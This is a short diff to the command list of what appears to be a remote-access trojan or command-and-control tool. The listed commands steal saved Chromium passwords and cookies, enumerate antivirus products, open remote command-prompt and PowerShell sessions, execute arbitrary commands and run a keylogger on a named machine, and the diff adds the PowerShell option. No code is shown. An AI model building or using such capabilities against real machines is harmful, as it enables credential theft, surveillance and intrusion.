@@ -34,8 +34,9 @@ getav {machine_name} : Get all antivirus products installed on specified machine
 getlogins {machine_name} : Get saved Chromium-based browser passwords on specified machine.
 getcookies {machine_name} : Get saved Chromium-based browser cookies on specified machine.
 
-shell {machine_name} : Start remote shell on specified machine.
-command {machine_name} {command} : Execute command on specified machine.
+shell {machine_name} : Start remote command prompt session on specified machine.
+powershell {machine_name} : Start remote PowerShell session on specified machine.
+execute {machine_name} {command} : Execute command on specified machine.
 
 startkeylogger {machine_name} : Start keylogger on specified machine.
 stopkeylogger {machine_name} : Stop keylogger on specified machine.
